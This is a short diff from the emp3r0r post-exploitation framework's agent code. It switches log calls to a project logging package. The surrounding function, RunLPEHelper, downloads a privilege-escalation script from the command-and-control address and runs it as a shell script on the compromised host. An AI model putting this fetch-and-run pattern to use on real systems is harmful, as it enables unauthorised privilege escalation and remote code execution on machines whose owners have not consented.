@@ -5,9 +5,10 @@ package modules
 
 import (
 	"fmt"
-	"log"
 	"os"
 	"strings"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
@@ -41,7 +42,7 @@ func CopySelfTo(dest_file string) (err error) {
 
 // RunLPEHelper runs helper scripts to give you hints on how to escalate privilege
 func RunLPEHelper(method, checksum string) (out string) {
-	log.Printf("Downloading LPE script from %s", def.CCAddress+method)
+	logging.Printf("Downloading LPE script from %s", def.CCAddress+method)
 	var scriptData []byte
 	scriptData, err := c2transport.SmartDownload("", method, "", checksum)
 	if err != nil {
@@ -49,10 +50,10 @@ func RunLPEHelper(method, checksum string) (out string) {
 	}
 
 	// run the script
-	log.Printf("Running LPE helper %s", method)
+	logging.Printf("Running LPE helper %s", method)
 	out, err = agentutils.RunShellScript(scriptData, os.Environ())
 	if err != nil {
-		return fmt.Sprintf("Run LPE helper %s failed: %s %v", method, out, err)
+		return logging.Sprintf("Run LPE helper %s failed: %s %v", method, out, err)
 	}
 
 	return out
